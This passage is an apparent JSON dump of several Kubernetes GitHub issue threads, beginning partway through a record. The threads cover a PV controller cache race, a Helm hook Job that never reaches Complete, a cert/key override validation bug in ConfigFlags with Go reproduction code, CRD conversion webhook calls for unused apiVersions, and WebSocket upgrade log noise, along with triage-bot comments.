cache stays consistent on concurrent access.\r\n\r\n### How can we reproduce it (as minimally and precisely as possible)?\r\n\r\nHard to reproduce, this only happens with a small chance.\r\n\r\nWe observed condition 1 when we try to optimize the throughput of PV controller.\r\n\r\n### Anything else we need to know?\r\n\r\nTo fix race condition 2, I propose: add locks around `storeObjectUpdate()`\r\n\r\nTo fix race condition 1, I propose: explicitly differentiate update and add event, do not allow add for internal update response.\r\n\r\n### Kubernetes version\r\n\r\n<details>\r\n\r\n```console\r\n$ kubectl version\r\n# paste output here\r\n```\r\n\r\n</details>\r\n\r\n\r\n### Cloud provider\r\n\r\n<details>\r\n\r\n</details>\r\n\r\n\r\n### OS version\r\n\r\n<details>\r\n\r\n```console\r\n# On Linux:\r\n$ cat /etc/os-release\r\n# paste output here\r\n$ uname -a\r\n# paste output here\r\n\r\n# On Windows:\r\nC:\\> wmic os get Caption, Version, BuildNumber, OSArchitecture\r\n# paste output here\r\n```\r\n\r\n</details>\r\n\r\n\r\n### Install tools\r\n\r\n<details>\r\n\r\n</details>\r\n\r\n\r\n### Container runtime (CRI) and version (if applicable)\r\n\r\n<details>\r\n\r\n</details>\r\n\r\n\r\n### Related plugins (CNI, CSI, ...) and versions (if applicable)\r\n\r\n<details>\r\n\r\n</details>\r\n", "issue_labels": ["kind/bug", "sig/storage", "lifecycle/rotten", "needs-triage"], "comments": [{"author": "huww98", "body": "/sig storage"}, {"author": "huww98", "body": "/cc @jsafrane \r\nrelated #25881"}, {"author": "xing-yang", "body": "/triage accepted"}, {"author": "jsafrane", "body": ">  1. internal update overwrites external delete. When a object is deleted from APIServer, an update request from controller itself may still in-flight. After the update returns, it tries to insert the object back to the cache, overwriting deletion propagated from informer. Resulting in the object staying in cache forever. Subsequently causing, for example, PV stay in Bound state forever and cannot be released.\r\n\r\n@huww98 did you observe this race condition in a real cluster? I think it's mostly theoretical.\r\n\r\nI could imagine something like a new parameter `storeObjectUpdate(..., store cache.Store, obj interface{}, force bool)` that would store the object when it's missing in the cache only when `force == true`. This would be used only in the initial sync or as reaction to informer event. Otherwise, if the object is missing (i.e. must have been deleted from the informer), then it's not added back to the cache. This is of course just an ugly hack on top of the cache. It would be the best to get rid of the whole cache instead. Smart ideas are welcome!\r\n\r\n> 2. read-compare-write in storeObjectUpdate(). When invoked concurrently, an old version (defined by ResourceVersion) may overwrite new version. Resulting in unbounded cache stall.\r\n\r\nThis should get fixed by a periodic sync every 15 seconds. I know we should not depend on it and 15s is a bit aggressive, but it works here."}, {"author": "huww98", "body": "> did you observe this race condition in a real cluster? I think it's mostly theoretical.\r\n\r\nYes. I've seen this in our production cluster, which has some patches to increase the throughput of PV controller. We saw a PV stay in Bound for no reason. And after we created and deleted the referenced PVC once again, the PV was successfully released. We have seen this at least twice.\r\n \r\n> I could imagine something like a new parameter `storeObjectUpdate(..., store cache.Store, obj interface{}, force bool)` that would store the object when it's missing in the cache only when `force == true`. This would be used only in the initial sync or as reaction to informer event. Otherwise, if the object is missing (i.e. must have been deleted from the informer), then it's not added back to the cache. This is of course just an ugly hack on top of the cache. It would be the best to get rid of the whole cache instead. Smart ideas are welcome!\r\n\r\nYes, this is exactly how I try to fix it in our internal branch.\r\n\r\nWe can also just use `Store.Add()` in informer add event handler and init. Then change `storeObjectUpdate()` to only support update.\r\n\r\nI've experimented with another approach. Take the informer cache as the truth, and suppress the stall events. Use a `sync.Map` to maintain the latest generation of each UID, then ignore the update event of stall object, or do not consider stall objects when syncing. At least we cannot mistake deleted object as existing in this approach. But I need to check the generation when reading the cache. We can use `CompareAndSwap` to update the generation map, which seems to be more lightweight and elegant. We can also make good use of informer indexer in this approach.\r\n\r\n> This should get fixed by a periodic sync every 15 seconds. I know we should not depend on it and 15s is a bit aggressive, but it works here.\r\n\r\nI agree, edited the issue to reflect this."}, {"author": "jsafrane", "body": "> I've experimented with another approach. Take the informer cache as the truth, and suppress the stall events. Use a sync.Map to maintain the latest generation of each UID, then ignore the update event of stall object, or do not consider stall objects when syncing. At least we cannot mistake deleted object as existing in this approach. But I need to check the generation when reading the cache. We can use CompareAndSwap to update the generation map, which seems to be more lightweight and elegant. We can also make good use of informer indexer in this approach.\r\n\r\nDoes `metdata.generation` even work on PVs and PVCs? I can see they're empty both of them."}, {"author": "huww98", "body": "> Does `metdata.generation` even work on PVs and PVCs? I can see they're empty both of them.\r\n\r\nCurrently no. But I think we can make it work. Or we can still use resource version, the principle should not change."}, {"author": "jsafrane", "body": "`generation` usually changes when `.spec` changes, not `.status`. And PV controller saves `pv.spec`, `pvc.spec`, `pv.status` and `pvc.status` in one go and it would be great if we could ignore the `.status` updates too. I am not sure it's possible with generation."}, {"author": "k8s-triage-robot", "body": "This issue has not been updated in over 1 year, and should be re-triaged.\n\nYou can:\n- Confirm that this issue is still relevant with `/triage accepted` (org members only)\n- Close this issue with `/close`\n\nFor more details on the triage process, see https://www.kubernetes.dev/docs/guide/issue-triage/\n\n/remove-triage accepted"}, {"author": "k8s-triage-robot", "body": "The Kubernetes project currently lacks enough contributors to adequately respond to all issues.\n\nThis bot triages un-triaged issues according to the following rules:\n- After 90d of inactivity, `lifecycle/stale` is applied\n- After 30d of inactivity since `lifecycle/stale` was applied, `lifecycle/rotten` is applied\n- After 30d of inactivity since `lifecycle/rotten` was applied, the issue is closed\n\nYou can:\n- Mark this issue as fresh with `/remove-lifecycle stale`\n- Close this issue with `/close`\n- Offer to help out with [Issue Triage][1]\n\nPlease send feedback to sig-contributor-experience at [kubernetes/community](https://github.com/kubernetes/community).\n\n/lifecycle stale\n\n[1]: https://www.kubernetes.dev/docs/guide/issue-triage/"}, {"author": "k8s-triage-robot", "body": "The Kubernetes project currently lacks enough active contributors to adequately respond to all issues.\n\nThis bot triages un-triaged issues according to the following rules:\n- After 90d of inactivity, `lifecycle/stale` is applied\n- After 30d of inactivity since `lifecycle/stale` was applied, `lifecycle/rotten` is applied\n- After 30d of inactivity since `lifecycle/rotten` was applied, the issue is closed\n\nYou can:\n- Mark this issue as fresh with `/remove-lifecycle rotten`\n- Close this issue with `/close`\n- Offer to help out with [Issue Triage][1]\n\nPlease send feedback to sig-contributor-experience at [kubernetes/community](https://github.com/kubernetes/community).\n\n/lifecycle rotten\n\n[1]: https://www.kubernetes.dev/docs/guide/issue-triage/"}, {"author": "k8s-triage-robot", "body": "The Kubernetes project currently lacks enough active contributors to adequately respond to all issues and PRs.\n\nThis bot triages issues according to the following rules:\n- After 90d of inactivity, `lifecycle/stale` is applied\n- After 30d of inactivity since `lifecycle/stale` was applied, `lifecycle/rotten` is applied\n- After 30d of inactivity since `lifecycle/rotten` was applied, the issue is closed\n\nYou can:\n- Reopen this issue with `/reopen`\n- Mark this issue as fresh with `/remove-lifecycle rotten`\n- Offer to help out with [Issue Triage][1]\n\nPlease send feedback to sig-contributor-experience at [kubernetes/community](https://github.com/kubernetes/community).\n\n/close not-planned\n\n[1]: https://www.kubernetes.dev/docs/guide/issue-triage/"}, {"author": "k8s-ci-robot", "body": "@k8s-triage-robot: Closing this issue, marking it as \"Not Planned\".\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/124224#issuecomment-3286388773):\n\n>The Kubernetes project currently lacks enough active contributors to adequately respond to all issues and PRs.\n>\n>This bot triages issues according to the following rules:\n>- After 90d of inactivity, `lifecycle/stale` is applied\n>- After 30d of inactivity since `lifecycle/stale` was applied, `lifecycle/rotten` is applied\n>- After 30d of inactivity since `lifecycle/rotten` was applied, the issue is closed\n>\n>You can:\n>- Reopen this issue with `/reopen`\n>- Mark this issue as fresh with `/remove-lifecycle rotten`\n>- Offer to help out with [Issue Triage][1]\n>\n>Please send feedback to sig-contributor-experience at [kubernetes/community](https://github.com/kubernetes/community).\n>\n>/close not-planned\n>\n>[1]: https://www.kubernetes.dev/docs/guide/issue-triage/\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}]}
{"repo": "kubernetes/kubernetes", "issue_number": 133903, "issue_url": "https://github.com/kubernetes/kubernetes/issues/133903", "issue_title": "Job SuccessPolicy uses SuccessCriteriaMet instead of Complete, causing Helm pre-install/pre-upgrade hooks to hang", "issue_author": "uni-raghavendra", "issue_body": "### What happened?\n\nWhen using a Helm pre-install hook Job, the Deployment never gets created even though the Job has finished successfully. For some reason the Job even after suuceeded the UncountedTerimatedPods are not going away and hence job is not going into complete state.\n\n\nstatus:\n  conditions:\n    - type: SuccessCriteriaMet\n      status: 'True'\n      lastProbeTime: '2025-09-05T06:10:23Z'\n      lastTransitionTime: '2025-09-05T06:10:23Z'\n      reason: CompletionsReached\n      message: Reached expected number of succeeded pods\n  startTime: '2025-09-05T06:10:09Z'\n  terminating: 0\n  uncountedTerminatedPods:\n    succeeded:\n      - ccbd79bb-77f2-44d5-b460-34a06d87fc26\n\nI see post of the jobs which have triggered the pods are stuck in Terminating stage and hence we are facing issue.\n\n### What did you expect to happen?\n\nWe expect as soon as the job succeed's it should come into complete state but that didn't happen\n\n### How can we reproduce it (as minimally and precisely as possible)?\n\nyou can add helm webhooks,\n\napiVersion: batch/v1\nkind: Job\nmetadata:\n  name: \"{{ .Release.Name }}-init-job\"\n  annotations:\n    \"helm.sh/hook\": pre-install,pre-upgrade\n    \"helm.sh/hook-weight\": \"0\"\n    \"helm.sh/hook-delete-policy\": hook-succeeded\nspec:\n  template:\n    spec:\n      containers:\n        - name: init\n          image: busybox\n          command: [\"sh\", \"-c\", \"echo 'Running DB migrations...' && sleep 10\"]\n      restartPolicy: Never\n  backoffLimit: 2\n---\napiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: \"{{ .Release.Name }}-app\"\nspec:\n  replicas: {{ .Values.replicaCount }}\n  selector:\n    matchLabels:\n      app: \"{{ .Release.Name }}-app\"\n  template:\n    metadata:\n      labels:\n        app: \"{{ .Release.Name }}-app\"\n    spec:\n      containers:\n        - name: app\n          image: \"{{ .Values.image.repository }}:{{ .Values.image.tag }}\"\n          imagePullPolicy: {{ .Values.image.pullPolicy }}\n          ports:\n            - containerPort: 80\n\nTried this with helm install. Job succeeded but never came into complete state hence the deployment didnt come up.\n\nJob controller is not cleaning up the terminating pods I feel that's adding to the issue\n\n### Anything else we need to know?\n\n_No response_\n\n### Kubernetes version\n\nk version\nClient Version: v1.32.2\nKustomize Version: v5.5.0\nServer Version: v1.32.7-eks-ace6451\n\n### Cloud provider\n\n<details>\nAWS. \n</details>\n\n\n### OS version\n\n<details>\n\n```console\n# On Linux:\n$ cat /etc/os-release\n# paste output here\n$ uname -a\n# paste output here\n\n# On Windows:\nC:\\> wmic os get Caption, Version, BuildNumber, OSArchitecture\n# paste output here\n```\n\n</details>\n\n\n### Install tools\n\n<details>\n\n</details>\n\n\n### Container runtime (CRI) and version (if applicable)\n\n<details>\n\n</details>\n\n\n### Related plugins (CNI, CSI, ...) and versions (if applicable)\n\n<details>\n\n</details>\n", "issue_labels": ["kind/bug", "sig/apps", "needs-triage"], "comments": [{"author": "k8s-ci-robot", "body": "This issue is currently awaiting triage.\n\nIf a SIG or subproject determines this is a relevant issue, they will accept it by applying the `triage/accepted` label and provide further guidance.\n\nThe `triage/accepted` label can be added by org members by writing `/triage accepted` in a comment.\n\n\n<details>\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "pacoxu", "body": "/sig apps\ncc @tenzen-y "}, {"author": "uni-raghavendra", "body": "This Issue was causing due to a kyevrno policy which are trying to mutate continuously hence k8 was not able to delete the terminating pods. Thanks closing this ticket "}]}
{"repo": "kubernetes/kubernetes", "issue_number": 133916, "issue_url": "https://github.com/kubernetes/kubernetes/issues/133916", "issue_title": "[cli-runtime] [client-go] ConfigFlags when set cert/key fields get validation error when merging with kubeconfig data", "issue_author": "n2h9", "issue_body": "### What happened?\n\nWhen using ConfigFlags with CertFile and KeyFile set to override a kubeconfig configuration that contains inline certificate data (ClientCertificateData and ClientKeyData), the configuration merge process fails with validation errors: \n\n```sh\ninvalid configuration: [client-cert-data and client-cert are both specified for <user>. client-cert-data will override., client-key-data and client-key are both specified for <user>; client-key-data will override]\n```\n\nAlso ConfigFlags does not allow to set ClientCertificateData and ClientKeyData.\n\n### What did you expect to happen?\n\nWhen  user sets CertFile of ConfigFlags expects override value of `overrides.AuthInfo.ClientCertData` to be set nil.\nWhen  user sets KeyFile of ConfigFlags expects override value of `overrides.AuthInfo.ClientKeyData` to be set nil.\n\nAnd during merge process override value are both taken into account. \n\n### How can we reproduce it (as minimally and precisely as possible)?\n\n1) prepare kubeconfig with ClientCertData and ClientKeyData\n2) instantiate ConfigFlags with CertFile and KeyFile\n3) call to configFlags.ToRESTConfig() -> receive validation error. \n\n<details>\n<summary>go code to reproduce</summary>\n\n```go\npackage main\n\nimport (\n\t\"fmt\"\n\t\"os\"\n\t\"path/filepath\"\n\n\t\"k8s.io/cli-runtime/pkg/genericclioptions\"\n\t\"k8s.io/client-go/tools/clientcmd\"\n\tclientcmdapi \"k8s.io/client-go/tools/clientcmd/api\"\n)\n\nfunc main() {\n\t// 1) Prepare kubeconfig with ClientCertificateData and ClientKeyData\n\ttmpDir, err := os.MkdirTemp(\"\", \"kubeconfig-test\")\n\tif err != nil {\n\t\tfmt.Printf(\"Failed to create temp dir: %v\\n\", err)\n\t\treturn\n\t}\n\tdefer os.RemoveAll(tmpDir)\n\n\tkubeconfigPath := filepath.Join(tmpDir, \"kubeconfig\")\n\n\tbaseConfig := &clientcmdapi.Config{\n\t\tClusters: map[string]*clientcmdapi.Cluster{\n\t\t\t\"test-cluster\": {\n\t\t\t\tServer:                   \"https://example.com:6443\",\n\t\t\t\tCertificateAuthorityData: []byte(\"fake-ca-data\"),\n\t\t\t},\n\t\t},\n\t\tAuthInfos: map[string]*clientcmdapi.AuthInfo{\n\t\t\t\"test-user\": {\n\t\t\t\tClientCertificateData: []byte(\"base-config-cert-data\"),\n\t\t\t\tClientKeyData:         []byte(\"base-config-key-data\"),\n\t\t\t},\n\t\t},\n\t\tContexts: map[string]*clientcmdapi.Context{\n\t\t\t\"test-context\": {\n\t\t\t\tCluster:  \"test-cluster\",\n\t\t\t\tAuthInfo: \"test-user\",\n\t\t\t},\n\t\t},\n\t\tCurrentContext: \"test-context\",\n\t}\n\n\terr = clientcmd.WriteToFile(*baseConfig, kubeconfigPath)\n\tif err != nil {\n\t\tfmt.Printf(\"Failed to write kubeconfig: %v\\n\", err)\n\t\treturn\n\t}\n\n\tcertFile := filepath.Join(tmpDir, \"client.crt\")\n\tkeyFile := filepath.Join(tmpDir, \"client.key\")\n\n\terr = os.WriteFile(certFile, []byte(\"override-cert-content\"), 0600)\n\tif err != nil {\n\t\tfmt.Printf(\"Failed to create cert file: %v\\n\", err)\n\t\treturn\n\t}\n\n\terr = os.WriteFile(keyFile, []byte(\"override-key-content\"), 0600)\n\tif err != nil {\n\t\tfmt.Printf(\"Failed to create key file: %v\\n\", err)\n\t\treturn\n\t}\n\n\terr = os.Setenv(\"KUBECONFIG\", kubeconfigPath)\n\tif err != nil {\n\t\tfmt.Printf(\"Failed to set KUBECONFIG env var: %v\\n\", err)\n\t\treturn\n\t}\n\tdefer os.Unsetenv(\"KUBECONFIG\")\n\n\t// 2) Instantiate ConfigFlags with CertFile and KeyFile\n\tconfigFlags := &genericclioptions.ConfigFlags{\n\t\tCertFile: &certFile,\n\t\tKeyFile:  &keyFile,\n\t}\n\n\t// 3) Call configFlags.ToRESTConfig()\n\t_, err = configFlags.ToRESTConfig()\n\tif err != nil {\n\t\tfmt.Printf(\"ERROR: %v\\n\", err)\n\t\treturn\n\t}\n\tfmt.Println(\"SUCCESS: ToRESTConfig() worked with no error!\")\n}\n\n```\n\n</details>\n\n### Anything else we need to know?\n\n_No response_\n\n### Kubernetes version\n\n<details>\n\n```console\nkubectl version\nClient Version: v1.32.2\nServer Version: v1.32.2\n```\n\n</details>\n\n\n### Cloud provider\n\n<details>\n\n</details>\n\n\n### OS version\n\n<details>\n\n\n\n```console\n# On Linux:\n$ cat /etc/os-release\n# paste output here\n$ uname -a\n# paste output here\n\n# On Windows:\nC:\\> wmic os get Caption, Version, BuildNumber, OSArchitecture\n# paste output here\n```\n\n</details>\n\n\n### Install tools\n\n<details>\n\n</details>\n\n\n### Container runtime (CRI) and version (if applicable)\n\n<details>\n\n</details>\n\n\n### Related plugins (CNI, CSI, ...) and versions (if applicable)\n\n<details>\n\n</details>\n", "issue_labels": ["kind/bug", "sig/api-machinery", "sig/cli", "triage/accepted"], "comments": [{"author": "n2h9", "body": "A fix for this: https://github.com/kubernetes/kubernetes/pull/133917  \ud83e\udd17 "}, {"author": "n2h9", "body": "/sig cli\n/sig api-machinery"}, {"author": "n2h9", "body": "/assign @n2h9 "}, {"author": "mpuckett159", "body": "/triage accepted"}, {"author": "Jefftree", "body": "fyi: Looks like there are two PRs both attempting to solve this. \n\nhttps://github.com/kubernetes/kubernetes/pull/133917\nhttps://github.com/kubernetes/kubernetes/pull/133918\n"}]}
{"repo": "kubernetes/kubernetes", "issue_number": 129979, "issue_url": "https://github.com/kubernetes/kubernetes/issues/129979", "issue_title": "CRD conversion webhooks should not be called for unused apiVersions", "issue_author": "sbueringer", "issue_body": "### What happened?\n\nWe have CRDs with multiple apiVersions. Even if the old (non-storage) apiVersions are not used at all we regularly receive conversion requests for them.\n\nWe roughly get 1 conversion request for each non-storage apiVersion per kube-apiserver instance for every CR create/update (actually a little bit less than that, but not sure why).\n\nSo if we have a CRD with 5 old apiVersions and a cluster with 3 kube-apiservers\n\n=> we get roughly 15 conversion requests for every create/update on a CR (it's slightly less than that - not sure why though)\n\n\n\n### What did you expect to happen?\n\nI would expect to only get conversion requests when conversion is required, e.g. if a client requests a CR in a different apiVersion than the one in which the object is stored in etcd.\n\n### How can we reproduce it (as minimally and precisely as possible)?\n\nCreate a Kubernetes cluster via kind\n```\nkind create cluster\n```\n\nDeploy the Cluster CRD\n```\n$ kubectl apply -f ./crd_cluster.yaml\n```\n\n<details>\n\n<summary>crd_cluster.yaml</summary>\n\n```yaml\napiVersion: apiextensions.k8s.io/v1\nkind: CustomResourceDefinition\nmetadata:\n  annotations:\n    controller-gen.kubebuilder.io/version: v0.17.0\n  name: clusters.cluster.x-k8s.io\nspec:\n  conversion:\n    strategy: Webhook\n    webhook:\n      conversionReviewVersions: [\"v1\", \"v1beta1\"]\n      clientConfig:\n        service:\n          namespace: system\n          name: webhook-service\n          path: /convert\n  group: cluster.x-k8s.io\n  names:\n    kind: Cluster\n    listKind: ClusterList\n    plural: clusters\n    singular: cluster\n  scope: Namespaced\n  versions:\n  - deprecated: true\n    name: v1alpha3\n    schema:\n      openAPIV3Schema:\n        properties:\n          spec:\n            properties:\n              paused:\n                type: boolean\n            type: object\n        type: object\n    served: false\n    storage: false\n  - deprecated: true\n    name: v1alpha4\n    schema:\n      openAPIV3Schema:\n        properties:\n          spec:\n            properties:\n              paused:\n                type: boolean\n            type: object\n        type: object\n    served: true\n    storage: false\n  - name: v1beta1\n    schema:\n      openAPIV3Schema:\n        properties:\n          spec:\n            properties:\n              paused:\n                type: boolean\n            type: object\n        type: object\n    served: true\n    storage: true\n```\n\n</details>\n\nDeploy the Cluster CR\n```\n$ kubectl apply -f ./cr_cluster.yaml\n```\n\n<details>\n\n<summary>cr_cluster.yaml</summary>\n\n```yaml\nkind: Cluster\napiVersion: cluster.x-k8s.io/v1beta1\nmetadata:\n  name: cluster-1\n  namespace: default\n```\n\n</details>\n\nObserve kube-apiserver logs\n\n```\n$ kubectl -n kube-system logs -f kube-apiserver-kind-control-plane\n...\nE0204 13:21:54.207206       1 watcher.go:567] failed to prepare current and previous objects: conversion webhook for cluster.x-k8s.io/v1beta1, Kind=Cluster failed: Post \"https://webhook-service.system.svc:443/convert?timeout=30s\": service \"webhook-service\" not found\n...\n\nE0204 13:30:47.583960       1 cacher.go:478] cacher (clusters.cluster.x-k8s.io): unexpected ListAndWatch error: failed to list cluster.x-k8s.io/v1alpha4, Kind=Cluster: conversion webhook for cluster.x-k8s.io/v1beta1, Kind=Cluster failed: Post \"https://webhook-service.system.svc:443/convert?timeout=30s\": service \"webhook-service\" not found; reinitializing...\nW0204 13:30:48.586795       1 reflector.go:569] storage/cacher.go:/cluster.x-k8s.io/clusters: failed to list cluster.x-k8s.io/v1alpha4, Kind=Cluster: conversion webhook for cluster.x-k8s.io/v1beta1, Kind=Cluster failed: Post \"https://webhook-service.system.svc:443/convert?timeout=30s\": service \"webhook-service\" not found\n...\nE0204 13:30:45.575802       1 cacher.go:478] cacher (clusters.cluster.x-k8s.io): unexpected ListAndWatch error: failed to list cluster.x-k8s.io/v1alpha3, Kind=Cluster: conversion webhook for cluster.x-k8s.io/v1beta1, Kind=Cluster failed: Post \"https://webhook-service.system.svc:443/convert?timeout=30s\": service \"webhook-service\" not found; reinitializing...\nW0204 13:30:46.579452       1 reflector.go:569] storage/cacher.go:/cluster.x-k8s.io/clusters: failed to list cluster.x-k8s.io/v1alpha3, Kind=Cluster: conversion webhook for cluster.x-k8s.io/v1beta1, Kind=Cluster failed: Post \"https://webhook-service.system.svc:443/convert?timeout=30s\": service \"webhook-service\" not found\n```\n\nSome comments:\n* First we deploy a CRD with the following apiVersions:\n  * v1alpha3: served: false, storage: false\n  * v1alpha4: served: true, storage: false\n  * v1beta1: served: true, storage: true\n* Then we deploy a v1beta1 Cluster CR\n* We can then see in the apiserver logs that the apiserver tries to create a ListWatch for v1alpha3 & v1alpha4\n  * This simple example to reproduce the issue doesn't implement an actual conversion webhook, so we simply get errors.\n  * If we would implement a conversion webhook the ListWatch would be created successfully and we could observe conversion requests for v1alpha3 / v1alpha4 (as mentioned above roughly for every single create/update of a Cluster CR)\n* As not a single CR has been read or written with v1alpha3 or v1alpha4 I would have expected to receive no conversion requests at all. Instead we see a very high number of conversion requests. This problem multiplies with the number of kube-apiserver's.\n\n### Anything else we need to know?\n\nWe opened a Slack thread for this issue and did some initial triage: https://kubernetes.slack.com/archives/C0EG7JC6T/p1736528576393239\n\nWhile debugging through the apiserver we found the following:\n* A GET request to one of our APIs leads to a call of [https://github.com/kubernetes/kubernetes/blob/439d2f7b4028638b3d8d9261bb046c3ba8d9[\u2026]apiextensions-apiserver/pkg/apiserver/customresource_handler.go](https://github.com/kubernetes/kubernetes/blob/439d2f7b4028638b3d8d9261bb046c3ba8d9bfcb/staging/src/k8s.io/apiextensions-apiserver/pkg/apiserver/customresource_handler.go#L611)\n* `getOrCreateServingInfoFor` then iterates through all versions of our CRD and calls customresource.NewStorage for them\n* Then a few layers deeper reflectors are created for all versions\n\nSo if we understand this correctly the apiserver creates reflectors (with list & watch) for all versions of all CRDs (also independent of if the versions are served or not):\n![Image](https://github.com/user-attachments/assets/cff93477-913e-4811-aeca-de7dadbe0a43)\n\nWe think these reflectors are then later calling the conversion webhooks:\n![Image](https://github.com/user-attachments/assets/36dc7888-95c3-4e2e-89e8-471f2668090a)\n\n\n@sttts opened a PR with the goal to stop creating ListWatches for unserved versions: https://github.com/kubernetes/kubernetes/pull/129709\n\n\n### Kubernetes version\n\n<details>\n\n```console\n$ kubectl version\nClient Version: v1.32.0\nKustomize Version: v5.5.0\nServer Version: v1.32.0\n```\n\n</details>\n\n\n### Cloud provider\n\n<details>\n-\n</details>\n\n\n### OS version\n\n<details>\n\nApple Silicon M2\n\n</details>\n\n\n### Install tools\n\n<details>\n-\n</details>\n\n\n### Container runtime (CRI) and version (if applicable)\n\n<details>\n-\n</details>\n\n\n### Related plugins (CNI, CSI, ...) and versions (if applicable)\n\n<details>\n-\n</details>\n", "issue_labels": ["kind/bug", "sig/api-machinery", "help wanted", "triage/accepted"], "comments": [{"author": "sbueringer", "body": "/sig api-machinery"}, {"author": "sbueringer", "body": "Just fyi, this issue is made more relevant because today it's pretty hard / very hacky to remove apiVersions. More details in: https://github.com/kubernetes/kubernetes/issues/111937"}, {"author": "BenTheElder", "body": "/triage accepted\n/help\n\nThis may be a tricky one, explicitly not marking it \"good first issue\"."}, {"author": "k8s-ci-robot", "body": "@BenTheElder: \n\tThis request has been marked as needing help from a contributor.\n\n### Guidelines\nPlease ensure that the issue body includes answers to the following questions:\n- Why are we solving this issue?\n- To address this issue, are there any code changes? If there are code changes, what needs to be done in the code and what places can the assignee treat as reference points?\n- Does this issue have zero to low barrier of entry?\n- How can the assignee reach out to you for help?\n\n\nFor more details on the requirements of such an issue, please see [here](https://git.k8s.io/community/contributors/guide/help-wanted.md) and ensure that they are met.\n\nIf this request no longer meets these requirements, the label can be removed\nby commenting with the `/remove-help` command.\n\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/129979):\n\n>/triage accepted\n>/help\n>\n>This may be a tricky one, explicitly not marking it \"good first issue\".\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "GrigoriyMikhalkin", "body": "/assign"}]}
{"repo": "kubernetes/kubernetes", "issue_number": 134000, "issue_url": "https://github.com/kubernetes/kubernetes/issues/134000", "issue_title": "WebSocket streaming upgrade failures create excessive log noise during container lifecycle transitions", "issue_author": "sohankunkerkar", "issue_body": "### What happened?\n\nDuring normal Kubernetes operations, kubelet's streaming server logs frequent `unable to upgrade websocket connection: websocket server finished before becoming ready` errors at ERROR level. These errors occur during container lifecycle transitions (creation, termination, cleanup) but do not impact functionality since client-side fallback to SPDY handles them gracefully.\n\n```sh\n  Log Pattern:\n  time=\"2025-07-08T20:37:33.311285139Z\" level=error msg=\"Unhandled Error: unable to upgrade websocket connection: websocket server\n  finished before becoming ready (logger=\\\"UnhandledError\\\")\"\n```\n\n  Root Cause:\n  Race condition between WebSocket streaming setup and rapid container state changes. When kubectl/operators initiate streaming\n  operations (exec, attach, logs) during container lifecycle transitions, the WebSocket server setup fails before becoming ready, but\n  SPDY fallback ensures the operation completes successfully.\n\nxref: https://issues.redhat.com/browse/OCPBUGS-60036\n\n### What did you expect to happen?\n\n  WebSocket upgrade failures that are gracefully handled by fallback mechanisms should not generate ERROR-level log noise.\n\n\n### How can we reproduce it (as minimally and precisely as possible)?\n\nWe are seeing a bunch of errors in Openshift CI. You can look into https://issues.redhat.com/browse/OCPBUGS-60036 to get more details.\n\n### Anything else we need to know?\n\n_No response_\n\n### Kubernetes version\n\n<details>\n\n```console\n$ kubectl version\n1.33\n```\n\n</details>\n\n\n### Cloud provider\n\n<details>\nAny cloud\n</details>\n\n\n### OS version\n\n<details>\n\n```console\n$ cat /etc/os-release\n  NAME=\"Red Hat Enterprise Linux CoreOS\"\n  VERSION=\"9.6.20250707-1 (Plow)\"\n  ID=\"rhcos\"\n  ID_LIKE=\"rhel fedora\"\n  VERSION_ID=\"9.6\"\n```\n\n</details>\n\n\n### Install tools\n\n<details>\n\n</details>\n\n\n### Container runtime (CRI) and version (if applicable)\n\n<details>\nCRI-O\n</details>\n\n\n### Related plugins (CNI, CSI, ...) and versions (if applicable)\n\n<details>\n\n</details>\n", "issue_labels": ["kind/bug", "sig/api-machinery", "triage/accepted"], "comments": [{"author": "sohankunkerkar", "body": "/sig api-machinery"}, {"author": "ardaguclu", "body": "As opposed to Kubernetes (`TranslateStreamCloseWebsocketRequests` feature is enabled by default), it is disabled by default in OpenShift. So that might be the issue. I'll have a look at this. However, from the Kubernetes point of view, this is not an issue. Because it shouldn't fall back to SPDY."}, {"author": "ardaguclu", "body": "I tried to explain the issue in [OpenShift](https://issues.redhat.com/browse/OCPBUGS-60036?focusedId=28036512&page=com.atlassian.jira.plugin.system.issuetabpanels:comment-tabpanel#comment-28036512). In my opinion, there is no issue in upstream and we can close this. "}, {"author": "Jefftree", "body": "/cc @seans3 \n/triage accepted"}, {"author": "aojea", "body": "> I tried to explain the issue in [OpenShift](https://issues.redhat.com/browse/OCPBUGS-60036?focusedId=28036512&page=com.atlassian.jira.plugin.system.issuetabpanels:comment-tabpanel#comment-28036512). In my opinion, there is no issue in upstream and we can close this.\n\n/close\n\n"}, {"author": "k8s-ci-robot", "body": "@aojea: Closing this issue.\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/134000#issuecomment-3282752714):\n\n>> I tried to explain the issue in [OpenShift](https://issues.redhat.com/browse/OCPBUGS-60036?focusedId=28036512&page=com.atlassian.jira.plugin.system.issuetabpanels:comment-tabpanel#comment-28036512). In my opinion, there is no issue in upstream and we can close this.\n>\n>/close\n>\n>\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}]}
